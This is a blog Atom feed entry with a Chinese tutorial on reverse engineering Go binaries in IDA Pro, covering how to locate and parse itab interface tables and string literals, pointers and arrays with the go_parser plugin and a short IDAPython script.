<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JiaYu&#39;s Blog</title>
  <subtitle>浪人</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://jiayu0x.com/"/>
  <updated>2020-09-25T09:58:52.117Z</updated>
  <id>http://jiayu0x.com/</id>
  
  <author>
    <name>0xjiayu</name>
    <email>jiayu0x@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Go二进制文件逆向分析从基础到进阶(4)——itab与strings</title>
    <link href="http://jiayu0x.com/2020/09/25/go-binary-reverse-engineering-itab-and-strings/"/>
    <id>http://jiayu0x.com/2020/09/25/go-binary-reverse-engineering-itab-and-strings/</id>
    <published>2020-09-24T16:00:00.000Z</published>
    <updated>2020-09-25T09:58:52.117Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/218377" target="_blank" rel="external">https://www.anquanke.com/post/id/218377</a></p>
<p>书接前文，本文介绍 Go 语言二进制文件中的 <code>&lt;Interface, type&gt;</code> 映射表和字符串信息，以及如何定位并解析它们。</p>
</blockquote>
<p><strong>传送门</strong>：</p>
<ol>
<li><a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶(1)——综述</a></li>
<li><a href="https://www.anquanke.com/post/id/215419" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶(2)——MetaInfo、函数符号和源码文件路径列表</a></li>
<li><a href="https://www.anquanke.com/post/id/215820" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶(3)——数据类型</a></li>
</ol>
<h2 id="9-Interface-映射表-itab-link"><a href="#9-Interface-映射表-itab-link" class="headerlink" title="9. Interface 映射表(itab_link)"></a>9. Interface 映射表(itab_link)</h2><h3 id="9-1-概念介绍"><a href="#9-1-概念介绍" class="headerlink" title="9.1 概念介绍"></a>9.1 概念介绍</h3><p>在 Go 语言的规范中，Interface(接口) 用来定义一组行为(Interface Methods)，所有实现了这一组行为的其他类型，都可称之为<strong>实现了这个接口</strong>。Go 语言中 Interface 的用法还算是有些难点的，比如<strong>空接口</strong>的用法、以及更复杂一些的基于 Interface 实现的面向对象的<strong>多态</strong>特性。</p>
<p>前文《<a href="https://www.anquanke.com/post/id/215820" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶——数据类型</a>》中已经阐述过 Interface 类型的底层定义：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> interfaceType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    pkgPath name      <span class="comment">// import path</span></div><div class="line">    methods []imethod <span class="comment">// sorted by hash</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">type</span> imethod <span class="keyword">struct</span> &#123;</div><div class="line">    name nameOff <span class="comment">// name of method</span></div><div class="line">    typ  typeOff <span class="comment">// .(*FuncType) underneath</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其实，在 Go 二进制文件中，还保留了 Interface 与实现 Interface 的其他类型之间的映射关系。每一组映射关系，叫 <strong>itab</strong>(Interface Table)，<strong>itab</strong> 的结构如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Interface table</span></div><div class="line"><span class="comment">// Refer: https://golang.org/src/runtime/runtime2.go</span></div><div class="line"></div><div class="line"><span class="keyword">type</span> itab <span class="keyword">struct</span> &#123;</div><div class="line">    inter *interfacetype</div><div class="line">    _type *_type</div><div class="line">    hash  <span class="keyword">uint32</span> <span class="comment">// copy of _type.hash. Used for type switches.</span></div><div class="line">    _     [<span class="number">4</span>]<span class="keyword">byte</span></div><div class="line">    fun   [<span class="number">1</span>]<span class="keyword">uintptr</span> <span class="comment">// variable sized. fun[0]==0 means _type does not implement inter.</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>其中有 3 个关键字段：</p>
<ol>
<li>第 1 个 <strong>inter</strong>，指向一个 Interface 类型的定义；</li>
<li>第 2 个 <strong>_type</strong>，指向一个普通数据类型的定义信息，这个 <strong>_type</strong> 实现了上面指定的 Interface；</li>
<li>第 5 个 <strong>fun</strong>，指向一组方法，是上面第 2 个字段 <strong>_type</strong> 中具体实现的 Interface 中定义的方法。</li>
</ol>
<h3 id="9-2-itab-实例"><a href="#9-2-itab-实例" class="headerlink" title="9.2 itab 实例"></a>9.2 itab 实例</h3><p>在 IDAPro 中，<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong>  解析好的一个 itab 项如下：</p>
<p><img src="/imgs/go_re/itab_in_ida.png" alt=""></p>
<p>上图表明，<strong><a href="https://golang.org/pkg/net/?m=all#Addr" target="_blank" rel="external">package net</a></strong> 中定义了一个 <strong>Addr Interface</strong>，其中包含 2 个方法：<code>Addr.Network()</code> 和 <code>Addr.String()</code>：</p>
<p><img src="/imgs/go_re/net_Addr_iface_in_netpkg.png" style="zoom:80%;"></p>
<p>在 IDAPro 中，<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong>  解析好的 <strong>Addr Interface</strong> 定义如下：</p>
<p><img src="/imgs/go_re/net_addr_iface_in_ida.png" alt=""></p>
<p>相应地，<strong><a href="https://golang.org/pkg/net/?m=all#TCPAddr" target="_blank" rel="external">package net</a></strong> 中另一个数据结构 <strong>TCPAddr</strong> 实现了上述 <strong>Addr Interface</strong>。官方文档如下：</p>
<p><img src="/imgs/go_re/net_tcpAddr_in_netpkg.png" alt=""></p>
<p>在 IDAPro 中，<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong>  解析好的 <code>net.TCPAddr</code> 类型定义如下：</p>
<p><img src="/imgs/go_re/net_tcpAddr_in_ida.png" alt=""></p>
<p>可以看到，<code>net.TCPAddr</code> 这个数据类型绑定了 7 个方法，其中 2 个可导出的方法分别是 <code>Network()</code> 和 <code>String()</code> ，正是这两个方法实现了 <code>net.Addr</code> Interface。</p>
<p>至于 <strong>itab</strong> 在 Go 二进制文件中是如何使用的？既然有了具体类型的定义，直接用具体类型不就可以了吗，为什么还要绕一圈映射一下实现的 Interface？如果有这类疑问，建议在 IDAPro 中打开一个 Go 二进制文件，找到某个 <strong>itab</strong> 结构的定义，以及通过交叉引用在 IDAPro 中这个 <strong>itab</strong> 是如何被调用的，再结合 Go 源码对照着看一下，应该能有所收获。</p>
<h3 id="9-3-查找并解析-itab"><a href="#9-3-查找并解析-itab" class="headerlink" title="9.3 查找并解析 itab"></a>9.3 查找并解析 itab</h3><p>上文介绍了单个 itab 的概念与结构解析，而一个 Go 二进制文件中可能存在几百甚至上千组 Interface 与具体数据类型的映射关系，即几百甚至上千个 itab 结构，如何把它们都找出来并一一解析呢？</p>
<p>首先需要说明的是，解析 itab 这个工作，依赖于前文介绍的解析所有数据类型定义的结果。解析了每一个数据类型的定义之后，才能知道每个 itab 结构中的 Interface 和具体数据类型的定义。</p>
<p>在本系列第二篇 《<a href="https://www.anquanke.com/post/id/215419" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶——MetaInfo、函数符号和源码文件路径列表</a>》中介绍 <strong>firstmoduledata</strong> 这个结构时，提到过这个结构里的一个字段： <strong>itab_link</strong>，并解释说 <strong>itab_link</strong> 指向 Go 二进制文件中的 Interface 映射表。分析过 Go 二进制文件的师傅可能注意过，<strong>itab_link</strong> 这个结构通常会在 ELF 文件中一个单独的 Section，就叫 <strong><code>.itablink</code></strong> 。然而我前文也说过，通过文件头中的 Section 来定位 Go 二进制文件中的关键数据并不靠谱，尤其是面对 ELF/PE/MachO 以及 PIE 这些不同文件类型的复杂情况，甚至 Section 信息被篡改甚至抹除时，更是如此。最靠谱的方式就是通过 <strong>firstmoduledata</strong> 中的字段来按图索骥，定位到各个关键数据结构的位置。</p>
<p>从 <strong>firstmoduledata</strong> 结构中 <strong>itab_link</strong> 字段定位到的 <strong>itablink</strong>，其实就是一个 itab 结构的地址列表，<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong>  解析好的 <strong>itablink</strong> 如下(一部分)：</p>
<p><img src="/imgs/go_re/itablink_in_ida.png" alt=""></p>
<p>其中每一项，都是一个 <strong>itab</strong> 结构的地址。每个 itab 结构体的命名规则，都是 <strong>(前缀)go_itab + 实际类型名 + Interface 名</strong>。最后， <strong>firstmoduledata</strong> 中也标明了 <strong>itablink</strong> 结构中 <strong>itab</strong> 地址的数量，所以根据 <strong>itablink</strong> 的起始地址和数量，依次解析相应的 <strong>itab</strong> 即可。</p>
<h2 id="10-字符串"><a href="#10-字符串" class="headerlink" title="10. 字符串"></a>10. 字符串</h2><h3 id="10-1-字符串简介"><a href="#10-1-字符串简介" class="headerlink" title="10.1 字符串简介"></a>10.1 字符串简介</h3><p>Go 语言中，string 类型是 <strong>值类型</strong>(相对于 <strong>引用类型</strong>)，是 Go 支持的基础类型之一。一个字符串是一个不可改变的字节序列，字符串可以包含任意的数据，但是通常是用来包含可读的文本，字符串是 UTF-8 字符的一个序列（当字符为 ASCII 码表上的字符时则占用 1 个字节，其它字符根据需要占用 2-4 个字节）。</p>
<p>Go 中字符串底层由两个元素来定义：<strong>字节序列的地址</strong> 和 <strong>字节序列的长度</strong>，而不是像 C 语言那样以一个起始地址和 <code>0x00</code> 结尾就能表示一个字符串。在 Go 二进制文件中，操作一个字符串也要同时引用这两个元素。比如某函数需要一个字符串类型的参数，传参时就要在栈上的参数空间留两个位置，一个位置把相应字节序列的地址传进去，另一个位置把字节序列的长度传进去。字符串类型的返回值操作同理。</p>
<p>在静态逆向分析 Go 二进制文件时，把 Go 二进制文件加载到 IDAPro 中查看反汇编出来的代码时，在操作字符串的汇编代码片段中，最多只能看到目标字符串的长度，而字符串还是处于未分析的原始字节序列的状态。大量的字符串处于这种状态时，会使逆向分析变得很费劲，很大程度上拉低逆向分析的效率。所以我们要想办法把这些字符串尽量都解析出来，然后在引用这个字符串的汇编代码处打 Comment 或者加上 Data Reference，就会让逆向工作的效率提升一个台阶。</p>
<p>刚加载进 IDAPro 中的 Go 二进制文件，引用未解析的<strong>字符串字面量</strong>的汇编代码片段如下：</p>
<p><img src="/imgs/go_re/un_analyzed_str.png" alt=""></p>
<p>经过 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong>  的解析，效果就会很直观了：</p>
<p><img src="/imgs/go_re/analyzed_str.png" alt=""></p>
<p>在 Go 二进制文件中，字符串整体上是按照长度依次存放在一个特定区域的。然而这个区域的起始地址、长度等属性没有固定的索引，所以无法像定位其他结构一样定位到所有字符串并一一解析。能用的办法，就是<strong>分析调用、操作字符串的的汇编指令片段的 Pattern，然后从所有汇编指令中暴力检索可能操作字符串的位置，提取到相应字符串的地址与长度进而解析能够查找到的字符串</strong>。</p>
<p>Go 二进制文件中的字符串，按照存放和引用方式，可以分为三种：</p>
<ul>
<li>字符串字面量，通常来说字符串常量(包括命名常量和未命名的字面常量)都会用这种形式；</li>
<li>字符串指针，字符串变量和一部分字符串常量会用这种形式。</li>
<li>字符串数组/切片</li>
</ul>
<p>这三种类型的字符串存取方式，从操作字符串的汇编代码片段来看，Pattern 不同，解析方法也不同，下文一一介绍。</p>
<h3 id="10-2-字符串字面量"><a href="#10-2-字符串字面量" class="headerlink" title="10.2 字符串字面量"></a>10.2 字符串字面量</h3><p>上面 10.1 小节的截图中介绍的例子，就是<strong>字符串字面常量</strong>。操作字符串字面量的汇编代码，会直接引用字节序列的地址，然后把字符串的长度当作汇编指令的一个立即数来使用。不过，根据不同的 CPU 位数、目标寄存器的不同，这样的汇编代码片段的 Pattern 有多种。 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong>  中可以解析的 x86 汇编指令 Pattern 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">mov     ebx, offset aWire ; &quot;wire&quot; # Get string</div><div class="line">mov     [esp], ebx</div><div class="line">mov     dword ptr [esp+4], 4 # String length</div><div class="line"></div><div class="line">mov     ebx, offset unk_8608FD5 # Get string</div><div class="line">mov     [esp+8], ebx</div><div class="line">mov     dword ptr [esp+0Ch], 0Eh # String length</div><div class="line"></div><div class="line">mov     ebx, offset unk_86006E6 # Get string</div><div class="line">mov     [esp+10h], ebx</div><div class="line">mov     dword ptr [esp+14h], 5 # String length</div><div class="line"></div><div class="line">mov     ebx, 861143Ch</div><div class="line">mov     dword ptr [esp+0F0h+var_E8+4], ebx</div><div class="line">mov     [esp+0F0h+var_E0], 19h</div><div class="line"></div><div class="line"># Found in newer versions of golang binaries</div><div class="line"></div><div class="line">lea     rax, unk_8FC736 ; str bytes addr</div><div class="line">mov     [rsp+38h+var_18], rax</div><div class="line">mov     [rsp+38h+var_10], 1Dh ;str len</div><div class="line"></div><div class="line">lea     rdx, unk_8F6E82 ; str bytes addr</div><div class="line">mov     [rsp+40h+var_38], rdx</div><div class="line">mov     [rsp+40h+var_30], 13h ; str len</div><div class="line"></div><div class="line">lea     eax, unk_82410F0 ; str bytes addr</div><div class="line">mov     [esp+94h+var_8C], eax</div><div class="line">mov     [esp+94h+var_88], 2 ; str len</div></pre></td></tr></table></figure>
<p>如此一来，就看一参考如上代码片段的 Pattern，暴力搜索所有代码中符合以上 Pattern 的代码片段，并尝试解析字符串信息。<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong>  的 string 解析模块，大部分代码从  <strong><a href="https://github.com/strazzere/golang_loader_assist" target="_blank" rel="external">golang_loader_assist</a></strong> 移植而来，目前只支持 x86 架构的二进制文件。如果有师傅有兴趣实现一下 ARM/MIPS/PPC 等架构二进制文件的字符串解析功能，欢迎提 PR。</p>
<h3 id="10-3-字符串指针"><a href="#10-3-字符串指针" class="headerlink" title="10.3 字符串指针"></a>10.3 字符串指针</h3><p>Go 二进制文件中的字符串指针则是另一种形式，在 IDAPro 中看，主要有 3 点特征：</p>
<ol>
<li>汇编代码中引用字符串时，不会直接引用字符序列的地址，而是会引用存放字符串地址的地址（字符串指针）；</li>
<li>汇编代码中可能会用到字符串的长度，但不会把字符串的长度作为汇编指令的立即数，而是把字符串长度的数值存到一个位置，汇编代码只引用存放字符串长度的地址；</li>
<li>字符串长度的地址，紧挨着字符串指针后面存放。</li>
</ol>
<p>下面是 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong>  解析好的一个字符串指针的用法：</p>
<p><img src="/imgs/go_re/str_ptr_analyzed.png" alt=""></p>
<p>上面那种形式，可以用 IDAPython 在 IDAPro 中暴力搜索并解析如下 Pattern 的汇编指令片段来解析：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov     rcx, cs:qword_BC2908 ; str len</div><div class="line">mov     rdx, cs:off_BC2900 ; str pointer</div><div class="line">mov     [rsp+0A8h+var_90], rdx</div><div class="line">mov     [rsp+0A8h+var_88], rcx</div><div class="line">call    func</div></pre></td></tr></table></figure>
<p>而还有一种方式，Pattern 不明显，不便自动化解析。举个例子，如下是 <code>package bufio</code> 中 Reader 的 <code>fill()</code> 方法：</p>
<p><img src="/imgs/go_re/str_ptr.png" alt=""></p>
<p>可以发现 <code>runtime_gopanic()</code> 函数调用字符串的时候传入了一个 <strong>string</strong> 类型，和字符序列的地址，并未指定字符串的长度。对应的<a href="https://golang.org/src/bufio/bufio.go?s=2408:2431#L96" target="_blank" rel="external">源码实现</a>如下，可以对比着看一下 ：</p>
<p><img src="/imgs/go_re/str_ptr_srccode.png" alt=""></p>
<p>对于这种形式的字符串指针，只好另寻他法。好在 Go 二进制文件中的字符串指针也是集中存放在一个固定区域中的。如下，是这一块区域的开头部分：</p>
<p><img src="/imgs/go_re/str_ptr_field.png" alt=""></p>
<p>我们可以手动在 IDAPro 中找到这一块区域的起始地址、终止地址，然后手动执行以下 IDAPython 脚本，即可批量把所有字符串指针解析出来。如果是用 IDAPro v7.2 及以上版本，那么 IDAPro 会自动为这些字符串指针引用的指令加上 Data Reference。IDAPython 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></div><div class="line"><span class="string">'''</span></div><div class="line">go_parser.py:</div><div class="line">IDA Plugin for Golang Executable file parsing.</div><div class="line">'''</div><div class="line"></div><div class="line">__author__ = <span class="string">"JiaYu"</span></div><div class="line">__license__ = <span class="string">"MIT"</span></div><div class="line">__version__ = <span class="string">"1.0"</span></div><div class="line">__email__ = [<span class="string">"jiayu0x@gmail.com"</span>]</div><div class="line"></div><div class="line"><span class="keyword">import</span> idc, idaapi</div><div class="line">idaapi.require(<span class="string">"common"</span>) <span class="comment"># common module in go_parser</span></div><div class="line"></div><div class="line">START_EA = <span class="number">0x98C710</span></div><div class="line">END_EA = <span class="number">0x990F58</span></div><div class="line"></div><div class="line">curr_addr = START_EA</div><div class="line"><span class="keyword">while</span> curr_addr &lt;= END_EA:</div><div class="line">    curr_str_addr = common.read_mem(curr_addr)</div><div class="line">    curr_str_len = common.read_mem(curr_addr + common.ADDR_SZ)</div><div class="line">    <span class="keyword">if</span> curr_str_addr &gt; <span class="number">0</span> <span class="keyword">and</span> curr_str_addr != idc.BADADDR <span class="keyword">and</span> curr_str_len &gt; <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> idc.MakeStr(curr_str_addr, curr_str_addr + curr_str_len):</div><div class="line">            idaapi.autoWait()</div><div class="line"></div><div class="line">            curr_str = str(idc.GetManyBytes(curr_str_addr, curr_str_len))</div><div class="line">            print(<span class="string">"@ 0x%x: %s"</span> % (curr_str_addr, curr_str))</div><div class="line"></div><div class="line">    curr_addr += <span class="number">2</span> * common.ADDR_SZ</div></pre></td></tr></table></figure>
<blockquote>
<p><strong>Note:</strong></p>
<p>上面这段代码已同步到 <strong>go_parser</strong> 的 Github Repo:<br><a href="https://github.com/0xjiayu/go_parser/blob/master/str_ptr.py" target="_blank" rel="external">https://github.com/0xjiayu/go_parser/blob/master/str_ptr.py</a></p>
</blockquote>
<p>另外一个可以考虑的思路，是遍历上面提到的 <code>string</code> 类型定义的交叉引用，然后看看有没有如上的汇编指令片段的 Pattern。如果一段汇编代码中拿 <code>string</code> 类型定义去解析一个字符串，那么就可以顺藤摸瓜找到字符串指针，字符串指针的地址后面紧挨着就是字符串的长度，这样也可以把字符串解析出来。感兴趣的师傅可以验证一下。</p>
<h3 id="10-4-字符串数组"><a href="#10-4-字符串数组" class="headerlink" title="10.4 字符串数组"></a>10.4 字符串数组</h3><p>字符串数组，在 Go 二进制文件里的展示方式，比上面的情况要再多“跳转”一步：整个数组用<strong>元素起始地址</strong>和<strong>数组长度</strong> 两个元素来表示，而元素的起始地址处则依次存放了每一个字符串的地址和长度。语言描述不易理解，且看实例。以 <code>package mime</code> 中的 <code>initMimeUnix()</code> 函数为例，<a href="https://golang.org/src/mime/type_unix.go?s=910:929#L41" target="_blank" rel="external">源代码</a>如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> typeFiles = []<span class="keyword">string</span>&#123;</div><div class="line">	<span class="string">"/etc/mime.types"</span>,</div><div class="line">	<span class="string">"/etc/apache2/mime.types"</span>,</div><div class="line">	<span class="string">"/etc/apache/mime.types"</span>,</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">initMimeUnix</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> _, filename := <span class="keyword">range</span> typeFiles &#123;</div><div class="line">		loadMimeFile(filename)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>而在 IDAPro 中来看，就是如下的样子：</p>
<p><img src="/imgs/go_re/str_arr.png" alt=""></p>
<p>Go 语言二进制文件中，所有的数组，无论数组中元素是什么类型，都是集中存放的，很难从这些存放数组元素的数据块中区分出哪些书字符串数组，哪些是别的类型的数组（比如 int 类型的数组）。而汇编代码中引用字符串数组的代码片段又没有很强的 Pattern，所以难以自动化地把这些字符串数组都解析好并在 IDAPro 中友好地展示出来。</p>
<p>可以考虑上面<strong>半自动化</strong>解析<strong>字符串指针</strong>的做法，在 IDAPro 中手动定位到一批字符串数组的位置，然后写几行 IDAPython 脚本将这些字符串数组批量解析。有兴趣的师傅不妨动手试一试。</p>
<p>至此，我们就可以把 Go 二进制文件中的字符串，在 IDAPro 中部分自动化的解析、部分半自动化地解析出来。之后再去看汇编代码，涉及字符串的操作就会一目了然。</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ol>
<li><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">https://github.com/0xjiayu/go_parser</a></li>
<li><a href="https://golang.org/src/mime/type_unix.go" target="_blank" rel="external">https://golang.org/src/mime/type_unix.go</a></li>
<li><a href="https://golang.org/src/bufio/bufio.go" target="_blank" rel="external">https://golang.org/src/bufio/bufio.go</a></li>
<li><a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">https://www.anquanke.com/post/id/214940</a></li>
<li><a href="https://www.anquanke.com/post/id/215419" target="_blank" rel="external">https://www.anquanke.com/post/id/215419</a></li>
<li><a href="https://www.anquanke.com/post/id/215820" target="_blank" rel="external">https://www.anquanke.com/post/id/215820</a></li>
<li><a href="https://golang.org/pkg/net/" target="_blank" rel="external">https://golang.org/pkg/net/</a></li>
<li><a href="https://github.com/strazzere/golang_loader_assist" target="_blank" rel="external">https://github.com/strazzere/golang_loader_assist</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客: &lt;a href=&quot;https://www.anquanke.com/post/id/218377&quot;&gt;https://www.anquanke.com/post/id/218377&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;书接前文，本文介绍 Go 语言二进制文件中的 &lt;code&gt;&amp;lt;Interface, type&amp;gt;&lt;/code&gt; 映射表和字符串信息，以及如何定位并解析它们。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;传送门&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/214940&quot;&gt;Go二进制文件逆向分析从基础到进阶(1)——综述&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/215419&quot;&gt;Go二进制文件逆向分析从基础到进阶(2)——MetaInfo、函数符号和源码文件路径列表&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/215820&quot;&gt;Go二进制文件逆向分析从基础到进阶(3)——数据类型&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;9-Interface-映射表-itab-link&quot;&gt;&lt;a href=&quot;#9-Interface-映射表-itab-link&quot; class=&quot;headerlink&quot; title=&quot;9. Interface 映射表(itab_link)&quot;&gt;&lt;/a&gt;9. Interface 映射表(itab_link)&lt;/h2&gt;&lt;h3 id=&quot;9-1-概念介绍&quot;&gt;&lt;a href=&quot;#9-1-概念介绍&quot; class=&quot;headerlink&quot; title=&quot;9.1 概念介绍&quot;&gt;&lt;/a&gt;9.1 概念介绍&lt;/h3&gt;&lt;p&gt;在 Go 语言的规范中，Interface(接口) 用来定义一组行为(Interface Methods)，所有实现了这一组行为的其他类型，都可称之为&lt;strong&gt;实现了这个接口&lt;/strong&gt;。Go 语言中 Interface 的用法还算是有些难点的，比如&lt;strong&gt;空接口&lt;/strong&gt;的用法、以及更复杂一些的基于 Interface 实现的面向对象的&lt;strong&gt;多态&lt;/strong&gt;特性。&lt;/p&gt;
&lt;p&gt;前文《&lt;a href=&quot;https://www.anquanke.com/post/id/215820&quot;&gt;Go二进制文件逆向分析从基础到进阶——数据类型&lt;/a&gt;》中已经阐述过 Interface 类型的底层定义：&lt;/p&gt;
&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;type&lt;/span&gt; interfaceType &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    rtype&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    pkgPath name      &lt;span class=&quot;comment&quot;&gt;// import path&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    methods []imethod &lt;span class=&quot;comment&quot;&gt;// sorted by hash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;type&lt;/span&gt; imethod &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    name nameOff &lt;span class=&quot;comment&quot;&gt;// name of method&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    typ  typeOff &lt;span class=&quot;comment&quot;&gt;// .(*FuncType) underneath&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其实，在 Go 二进制文件中，还保留了 Interface 与实现 Interface 的其他类型之间的映射关系。每一组映射关系，叫 &lt;strong&gt;itab&lt;/strong&gt;(Interface Table)，&lt;strong&gt;itab&lt;/strong&gt; 的结构如下：&lt;/p&gt;
&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Interface table&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Refer: https://golang.org/src/runtime/runtime2.go&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;type&lt;/span&gt; itab &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; 